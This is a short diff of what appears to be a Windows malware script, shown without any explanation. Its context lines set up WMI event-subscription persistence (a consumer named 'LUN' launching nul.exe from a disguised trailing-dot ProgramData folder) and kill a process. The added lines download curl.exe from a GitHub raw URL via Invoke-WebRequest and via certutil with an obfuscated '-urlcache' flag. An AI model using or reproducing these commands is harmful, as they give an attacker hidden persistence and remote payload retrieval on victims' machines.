@@ -3,3 +3,5 @@ powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -
 taskkill.exe /f /IM nul.exe
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="LUN", CommandLineTemplate="%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='LUN'; CommandLineTemplate='%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul'} | Out-Null"
+powershell.exe Invoke-WebRequest -Uri https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
+certutil -url""""cache -split -f "https://github.com/vltex/1/raw/1/0/curl.exe" "%ProgramData%\curl.exe"
